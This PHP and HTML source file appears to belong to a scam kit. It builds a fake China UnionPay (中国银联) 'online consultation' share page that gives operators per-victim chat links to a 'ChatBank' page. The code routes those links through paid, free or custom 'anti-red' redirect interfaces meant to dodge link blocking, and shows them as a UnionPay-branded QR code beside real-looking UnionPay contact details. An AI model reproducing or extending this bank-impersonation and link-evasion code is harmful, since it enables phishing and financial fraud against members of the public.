<?php
if (!defined('FROM_ROUTER')) {
    http_response_code(403);
    exit('喜乐科技@x60898');
}
session_start();
require_once $_SERVER['DOCUMENT_ROOT'] . '/config/dbconfig.php';
checkLogin();

$currentAgent = $_SESSION['username'];

function generateCustomerName($length = 6) {
    $characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

// 生成客户名和会话ID
$customerName = generateCustomerName();
$sessionId = 'a' . $customerName . 'z-p' . $currentAgent . 's';
$xedataToken = createChatSession($sessionId, $customerName, $currentAgent, '银联');

// 生成原始链接
$currentDomain = $_SERVER['HTTP_HOST'];
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
$baseUrl = $protocol . "://" . $currentDomain;
$originalServiceUrl = $baseUrl . '/' . "ChatBank" . '?id=' . $sessionId;
if ($xedataToken) {
    $originalServiceUrl .= '&XEDATA=' . $xedataToken;
}


// 生成XEDATA令牌
function generateXEDataToken() {
    return md5(uniqid(mt_rand(), true));
}

// 创建会话记录到 XE-SKDJWKSNCDATA 表
function createChatSession($sessionId, $customerName, $agentAccount, $platform = '银联') {
    $db = getDB();
    if (!$db) return false;
    
    $xedataToken = generateXEDataToken();
    $expiresAt = date('Y-m-d H:i:s', strtotime('+7 days'));
    
    $stmt = $db->prepare("INSERT INTO `XE-SKDJWKSNCDATA` 
                         (session_id, xedata_token, customer_name, agent_account, expires_at, platform) 
                         VALUES (?, ?, ?, ?, ?, ?)");
    $stmt->bind_param("ssssss", $sessionId, $xedataToken, $customerName, $agentAccount, $expiresAt, $platform);
    
    if ($stmt->execute()) {
        return $xedataToken;
    }
    return false;
}

// 获取防红配置（修复版，调整优先级）
function getAntiRedConfig($username) {
     $db = getDB();
    if (!$db) return null;
    
    // 1. 首先检查防红开关是否开启
    $stmt = $db->prepare("SELECT apply_status FROM user_anti_red_config WHERE username = ?");
    $stmt->bind_param("s", $username);
    $stmt->execute();
    $result = $stmt->get_result();
    $config = $result->fetch_assoc();
    
    if (!$config) {
        // 如果没有配置记录，默认防红开关开启
        $apply_status = 'on';
    } else {
        $apply_status = $config['apply_status'];
    }
    
    // 如果防红开关关闭，直接返回null
    if ($apply_status === 'off') {
        return null;
    }
    
    // 2. 防红开关开启的情况下，检查session中是否有应用的接口（付费或免费）
    if (isset($_SESSION['applied_api_url']) && !empty($_SESSION['applied_api_url'])) {
        $type = $_SESSION['applied_domain_type'] ?? 'paid';
        $applied_domain = $_SESSION['applied_domain'] ?? '付费接口';
        
        return [
            'api_url' => $_SESSION['applied_api_url'],
            'apply_status' => 'on',
            'applied_domain' => $applied_domain,
            'encoding_mode' => 'base64',
            'type' => $type
        ];
    }
    
    // 3. 检查session中是否有自定义接口
    if (isset($_SESSION['custom_interface_url']) && !empty($_SESSION['custom_interface_url'])) {
        return [
            'api_url' => $_SESSION['custom_interface_url'],
            'apply_status' => 'on',
            'applied_domain' => isset($_SESSION['custom_interface_remark']) ? $_SESSION['custom_interface_remark'] : '自定义接口',
            'encoding_mode' => isset($_SESSION['custom_encoding_mode']) ? $_SESSION['custom_encoding_mode'] : 'base64',
            'type' => 'custom'
        ];
    }
    
    // 4. 从数据库查询用户配置
    if ($config['apply_status'] === 'on' && !empty($config['applied_domain'])) {
        $applied_domain = $config['applied_domain'];
        
        // 先尝试从免费接口表中查找
        $freeStmt = $db->prepare("SELECT api_url FROM freeantired WHERE name = ? AND status = 'active'");
        $freeStmt->bind_param("s", $applied_domain);
        $freeStmt->execute();
        $freeResult = $freeStmt->get_result();
        
        if ($freeResult->num_rows > 0) {
            // 是免费接口
            $freeData = $freeResult->fetch_assoc();
            $config['api_url'] = $freeData['api_url'];
            $config['type'] = 'free';
            $config['encoding_mode'] = 'base64';
            return $config;
        }
        
        // 再尝试从付费接口表中查找
        $paidStmt = $db->prepare("SELECT api_url FROM anti_red_links WHERE domain_name = ? AND sold_to = ?");
        $paidStmt->bind_param("ss", $applied_domain, $username);
        $paidStmt->execute();
        $paidResult = $paidStmt->get_result();
        
        if ($paidResult->num_rows > 0) {
            // 是付费接口
            $paidData = $paidResult->fetch_assoc();
            $config['api_url'] = $paidData['api_url'];
            $config['type'] = 'paid';
            $config['encoding_mode'] = 'base64';
            return $config;
        }
        
        // 如果都不是，检查是否是自定义接口（在 userantired 表中）
        $customStmt = $db->prepare("SELECT ua.api_url, ua.encoding 
                                    FROM userantired ua 
                                    JOIN users u ON ua.user_id = u.id 
                                    WHERE u.username = ? AND ua.remark = ? AND ua.status = 'active'");
        $customStmt->bind_param("ss", $username, $applied_domain);
        $customStmt->execute();
        $customResult = $customStmt->get_result();
        
        if ($customResult->num_rows > 0) {
            // 是自定义接口
            $customData = $customResult->fetch_assoc();
            $config['api_url'] = $customData['api_url'];
            $config['encoding_mode'] = $customData['encoding'] ?? 'base64';
            $config['type'] = 'custom';
            return $config;
        }
    }
    
    return null;
}

$antiRedConfig = getAntiRedConfig($currentAgent);
$serviceUrl = $originalServiceUrl;

// 读取源站URL配置
$db = getDB();
$webconfigResult = $db->query("SELECT site_url, site_url_enabled FROM webconfig ORDER BY id DESC LIMIT 1");
$siteUrlConfig = null;
if ($webconfigResult && $webconfigResult->num_rows > 0) {
    $siteUrlConfig = $webconfigResult->fetch_assoc();
}

if ($antiRedConfig && $antiRedConfig['apply_status'] === 'on' && !empty($antiRedConfig['api_url'])) {
    $encoding_mode = $antiRedConfig['encoding_mode'] ?? 'base64';
    
    // 根据编码模式处理URL
    switch ($encoding_mode) {
        case 'base64':
            $encodedUrl = base64_encode($originalServiceUrl);
            break;
        case 'urlencode':
        case 'url':
            $encodedUrl = urlencode($originalServiceUrl);
            break;
        case 'none':
        default:
            $encodedUrl = $originalServiceUrl;
            break;
    }
    
    $serviceUrl = $antiRedConfig['api_url'] . $encodedUrl;
    
    // 调试信息
    error_log("防红接口应用信息: " . json_encode([
        'type' => $antiRedConfig['type'] ?? 'unknown',
        'applied_domain' => $antiRedConfig['applied_domain'] ?? 'unknown',
        'api_url' => $antiRedConfig['api_url'],
        'encoding_mode' => $encoding_mode,
        'original_url' => $originalServiceUrl,
        'encoded_url' => $encodedUrl,
        'final_url' => $serviceUrl
    ]));
} elseif ($siteUrlConfig && !empty($siteUrlConfig['site_url_enabled']) && !empty($siteUrlConfig['site_url'])) {
    $serviceUrl = $siteUrlConfig['site_url'] . base64_encode($originalServiceUrl);
}

// 输出调试信息（开发环境中使用）
if (isset($_GET['debug'])) {
    echo "<!-- 防红配置信息: " . json_encode($antiRedConfig) . " -->\n";
    echo "<!-- 原始URL: $originalServiceUrl -->\n";
    echo "<!-- 最终URL: $serviceUrl -->\n";
    echo "<!-- Session状态: " . json_encode([
        'custom_interface_url' => $_SESSION['custom_interface_url'] ?? '未设置',
        'custom_encoding_mode' => $_SESSION['custom_encoding_mode'] ?? '未设置',
        'custom_interface_remark' => $_SESSION['custom_interface_remark'] ?? '未设置',
        'applied_api_url' => $_SESSION['applied_api_url'] ?? '未设置',
        'applied_domain' => $_SESSION['applied_domain'] ?? '未设置',
        'applied_domain_type' => $_SESSION['applied_domain_type'] ?? '未设置',
        'redirect_to_browser' => $_SESSION['redirect_to_browser'] ?? '未设置'
    ]) . " -->\n";
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>分享页</title>
    <link rel="stylesheet" href="/assets/SharePhoto/yinliana.css">
    <link rel="stylesheet" href="/assets/SharePhoto/yinlianb.css">
</head>
<body>
    <!-- 表单容器 - 完全按照旧页面样式 -->
    <div class="form-container">
        <div class="form-row">
            <label>防红</label>
            <a class="form-link anti-red-link" id="anti-red-status">
                            <?php 
                            if ($antiRedConfig && $antiRedConfig['apply_status'] === 'on') {
                                echo '已配置 (' . $antiRedConfig['applied_domain'] . ')';
                            } else {
                                echo '未配置';
                            }
                            ?>
            </a>
            <div class="copy-link-btn" id="copy-link-btn">
                <svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="18" height="18">
                    <path
                        d="M761.088 715.3152a38.7072 38.7072 0 0 1 0-77.4144 37.4272 37.4272 0 0 0 37.4272-37.4272V265.0112a37.4272 37.4272 0 0 0-37.4272-37.4272H425.6256a37.4272 37.4272 0 0 0-37.4272 37.4272 38.7072 38.7072 0 1 1-77.4144 0 115.0976 115.0976 0 0 1 114.8416-114.8416h335.4624a115.0976 115.0976 0 0 1 114.8416 114.8416v335.4624a115.0976 115.0976 0 0 1-114.8416 114.8416z"
                        p-id="5993" fill="#515151"></path>
                    <path
                        d="M589.4656 883.0976H268.1856a121.1392 121.1392 0 0 1-121.2928-121.2928v-322.56a121.1392 121.1392 0 0 1 121.2928-121.344h321.28a121.1392 121.1392 0 0 1 121.2928 121.2928v322.56c1.28 67.1232-54.1696 121.344-121.2928 121.344zM268.1856 395.3152a43.52 43.52 0 0 0-43.8784 43.8784v322.56a43.52 43.52 0 0 0 43.8784 43.8784h321.28a43.52 43.52 0 0 0 43.8784-43.8784v-322.56a43.52 43.52 0 0 0-43.8784-43.8784z"
                        p-id="5994" fill="#515151"></path>
                </svg>
                <div>复制链接</div>
            </div>
        </div>
    </div>

    <!-- 新UI内容 -->
    <div class="Nai-9RwaoltJT-Long">
        <div class="Nai-lK4owCY2D-Long">
            <div class="Nai-jXZ2OdZjY-Long">
                <!-- 左侧图标 -->
                <img class="Nai-vOcBjaRof-Long" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAABICAYAAABV7bNHAAAAAXNSR0IArs4c6QAAAYZJREFUeAHt2kFKw1AQxvEmWVR0YXKDkiOYUwi6EcGdN+gFui6ewBO4FjcWeoocwE3IEeKiYjeJ36NZdwYKklf+D8JbvOkw86NvM7zZjIUAAggggAACCCCAAAIIIIAAAgiclUDi6aaqqsuu61bDMDwmSbLQPvf8bmoxqn2v2lvt73mev9R1/WPV6AIqy/JTie6sZJGdb5qmubdqTq2A8bxyxkUTpn/RjadYF1CWZUsl23kSRhKz01ULPZnLdcVCFl2za6nfKvEiTdMLM/MEA/q+/1UPrXrY6np9T7BESkIAAQQQQAABBBBAAAEEEEAAgZMFGHcYhC4gzYIelOdN35WRL5bjMPx71kzowyrYNVFUkld954ITTEIvoSdzeYFqM1N8Aa6eXEBFUTxpVLmWwZf2fXwWh4rH2kMP69BTrH1QNwIIIIAAAggggAACCCCAAAIIIHCCgGvkyjNgQ5hnwAaQjnkGfMyIZ8DHdMYzngE7kAhBAAEEEEAAAQQQQAABBBBA4D8E/gA1NX0fA/1EoQAAAABJRU5ErkJggg==" alt="">
                <img class="Nai-vOcBjaRof-Long" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAAAXNSR0IArs4c6QAAA5VJREFUaAXtWDtrVEEYzT5gLfwFEhD2BZsmlaZIxO0CahmwsRCxiLBpjP4KtTJgCgkWNoKlCCmDsdjExibLPkGQ9Q+kWdiH51xmLpPrzt47M3ezAe+FZR53vnPmfPPNzHd3aSl5Eg8kHkg8sEgPpFzJi8ViLp1O3x4Oh8upVOoG8SaTST+bzf4ej8cnnU5n4Moxy95aQKlUejAajR5j0puY8PVpJHh3jneHmUzmQ7vd/jJtjGufsYByuUxvvwHxhiH5MVbleavVOjW0mzncSEA+n9+GV9/Cq1kVFX1naP/Ery/6GUqrGLci2l6BcUP07fR6vX2136UeWUChUHgF8heSDJNhbO/ht9/tdjuyXy1hU0R7G78abHPyHWxfw+albLuUkQTQ8yB5pxDVc7ncw0aj8Uvp01YrlcrNwWDwCQPWlEHP4liJUAGMeWzW7/CgDJvPOHUemZ4uPK1wKn2EgC2KYDhhc69jT5woooyr6TALblhl8nWbyZODgmmLap1tYorDgE3rZ6YAHpVA9k4bxjzDxtTz6sxoSwyxf/hqQ3Cow4zqMwXwnFfQ9qLGvGLzT1VgcPN7T4BDdkcutQIYs/DUpoIU29EHTB+LHORSeIyqWgFMDxCn3g0LkjPdUWnEJgYTi5hskoNcNji00QrABltWQHlJxf34mAEuIx6tAHjIS8wEmrxhjcBDBvuYAa4Qs4uvtQIuDptvCwImtgxaAYhN30MAV1fDlito52PigvsTfBm1rRXAfF4BWVXqcVV9zACXEb5WAD9GsLTnRMNqrIjEzAhcN5hYxOR7cpBLNzasXyuAtyZIDhUAJnRxPT4WOVxud60AzpRfUsqMa8wqlbZVVWDUpHGAQ3ZHLkOzUaTS34Dm5UMomczdtfWYyEiPgCPT6mOk1Hciz3bKwJkrwPHYYLuI06GwXWNKbHP1i8kznfYmT0x+Ygpc6yJUAPN1xOmOwrAFEUcm4cSxtAGG9y1ALGDWm83mDwXXqhoaQhI1zk9KiYnyAHnRU6yG9UUWWQBJY/qo5wfNOvHE4yTCSAAJHf9W2UXYnGI13wPqiRDAwlqEsQBJ6vLHFuI/FZcIawFSSLVavdbv928xJUYse/kNJhj612JcIpwFSCE2ZRwiFiqAol1FLFyAq4grIcBFxJURMEPEfeRLX/l+2hOaSkwzmlcfb2TezMA/mBfHpeByY+PWv8cf65dCmpAkHkg8kHjg//TAX+FKv0FyCEXbAAAAAElFTkSuQmCC" alt="">
                <div class="Nai-QWZetxwi7-Long">
                    <!-- 银联Logo -->
                    <img class="Nai-rx849zwtC-Long" src="/assets/img/yllogo.png" alt="中国银联">
                </div>
                <!-- 右侧图标 -->
                <img class="Nai-7nenqiaOY-Long" src="data:image/png;base64,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" alt="">
            </div>
            <div class="Nai-VuH0FJA7A-Long">
                <div class="Nai-6FQ9ss4HM-Long">
                    <div class="Nai--oyOc4-Bl-Long">联系我们</div>
                    <div class="Nai-92qU7ElOJ-Long">
                        中国银联为您提供便捷优质的服务体验<br>
                        欢迎通过以下方式与我们联系
                    </div>
                </div>
            </div>
            <div class="Nai-m4eK0OaqY-Long">
                <div class="Nai-6FQ9ss4HM-Long">
                    <div class="Nai-Kf7Qxu8---Long">
                        <div class="Nai-LHL-VamPC-Long">
                            <!-- 在线咨询图标 -->
                            <img src="/assets/img/yilianshare.png" alt="在线咨询">
                        </div>
                        <div class="Nai-WnFlClaRq-Long">
                            <div class="Nai-W6QpVOevU-Long">在线咨询</div>
                            <p>欢迎您使用中国银联</p>
                            <p>服务时间：全天24小时</p>
                            
                            <!-- 二维码容器 -->
                            <div class="qr-code-container" id="qrcode">
                                <!-- 二维码将在这里生成 -->
                            </div>
                        </div>
                    </div>
                    <div class="Nai-RAa0Z0wJV-Long">
                        <div class="Nai-mussSzf68-Long">银行合作</div>
                        <p>电话：(+86) 021-68401888 转银行合作部</p>
                        <p>服务时间：周一至周五 8:30-17:00</p>
                    </div>
                    <div class="Nai-RAa0Z0wJV-Long">
                        <div class="Nai-mussSzf68-Long">品牌与赞助</div>
                        <p>电话：(+86) 021-68401888 转品牌营销部</p>
                        <p>服务时间：周一至周五 8:30-17:00</p>
                    </div>
                    <div class="Nai-RAa0Z0wJV-Long">
                        <div class="Nai-mussSzf68-Long">商户合作</div>
                        <p>电话：4008695516</p>
                        <p>服务时间：工作日 9:00-18:00</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- 引入QRCode.js -->
    <script src="/assets/qrcode.min.js"></script>
    <script src="/assets/qrcode-helper.js"></script>
    <script>
        // 使用PHP动态生成的链接生成二维码
        var qrCodeUrl = <?php echo json_encode($serviceUrl); ?>;

        document.addEventListener('DOMContentLoaded', function() {
            // 生成客服二维码
            var qrcodeContainer = document.getElementById("qrcode");
            if (qrcodeContainer) {
                try {
                    new QRCode(qrcodeContainer, {
                        text: qrCodeUrl,
                        width: getQRSize(qrCodeUrl, 110),
                        height: getQRSize(qrCodeUrl, 110),
                        colorDark: "#000000",
                        colorLight: "#ffffff",
                        correctLevel: getQRCorrectLevel(qrCodeUrl)
                    });
                } catch(e) {
                    console.error('QR码生成失败，尝试降级:', e);
                    try {
                        qrcodeContainer.innerHTML = '';
                        new QRCode(qrcodeContainer, {
                            text: qrCodeUrl,
                            width: 140,
                            height: 140,
                            colorDark: "#000000",
                            colorLight: "#ffffff",
                            correctLevel: QRCode.CorrectLevel.L
                        });
                    } catch(e2) {
                        qrcodeContainer.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;width:110px;height:110px;background:#f5f5f5;border-radius:8px;color:#999;font-size:12px;text-align:center;padding:10px;">二维码生成失败</div>';
                    }
                }

                // 在二维码中间添加logo图标
                var logoImg = document.createElement('img');
                logoImg.src = '/assets/img/yinlian.ico';
                logoImg.className = 'qr-code-logo';
                logoImg.alt = '银联Logo';
                qrcodeContainer.appendChild(logoImg);
            }
            
            // 复制链接功能
            var copyLinkBtn = document.getElementById('copy-link-btn');
            if (copyLinkBtn) {
                copyLinkBtn.addEventListener('click', function() {
                    copyToClipboard(qrCodeUrl);
                });
            }
        });
        
        function copyToClipboard(text) {
            return new Promise(function(resolve, reject) {
                if (navigator.clipboard && window.isSecureContext) {
                    navigator.clipboard.writeText(text).then(function() {
                        resolve(true);
                    }).catch(function(err) {
                        console.error('复制失败:', err);
                        fallbackCopy(text, resolve, reject);
                    });
                } else {
                    fallbackCopy(text, resolve, reject);
                }
            }).then(function(success) {
                if (success) {
                    showToast('链接已复制到剪贴板！', 'success');
                } else {
                    showToast('复制失败，请手动复制', 'error');
                }
            });
        }
        
        function fallbackCopy(text, resolve, reject) {
            var textArea = document.createElement("textarea");
            textArea.value = text;
            textArea.style.position = "fixed";
            textArea.style.left = "-999999px";
            textArea.style.top = "-999999px";
            document.body.appendChild(textArea);
            textArea.focus();
            textArea.select();
            try {
                var successful = document.execCommand('copy');
                document.body.removeChild(textArea);
                resolve(successful);
            } catch (err) {
                console.error('复制失败:', err);
                document.body.removeChild(textArea);
                resolve(false);
            }
        }
        
        function showToast(message, type) {
            var container = document.getElementById('notification-container');
            if (!container) {
                container = document.createElement('div');
                container.id = 'notification-container';
                container.className = 'notification-container';
                document.body.appendChild(container);
            }
            
            var toast = document.createElement('div');
            toast.className = 'new-user-toast notification-enter-active';
            if (type) {
                if (type === 'error') {
                    toast.style.background = '#f44336';
                } else if (type === 'success') {
                    toast.style.background = '#4caf50';
                }
            }
            
            var icon = document.createElement('div');
            icon.className = 'toast-icon';
            icon.textContent = type === 'error' ? '!' : '✓';
            toast.appendChild(icon);
            
            var text = document.createElement('div');
            text.className = 'toast-text';
            text.textContent = message;
            toast.appendChild(text);
            
            var closeBtn = document.createElement('button');
            closeBtn.className = 'toast-close';
            closeBtn.innerHTML = '&times;';
            closeBtn.addEventListener('click', function() {
                removeToast(toast);
            });
            toast.appendChild(closeBtn);
            
            container.appendChild(toast);
            
            setTimeout(function() {
                toast.classList.add('notification-leave-active');
                setTimeout(function() {
                    removeToast(toast);
                }, 300);
            }, 3000);
            
            function removeToast(toast) {
                if (toast.parentNode) {
                    toast.parentNode.removeChild(toast);
                }
            }
        }
    </script>
</body>
</html>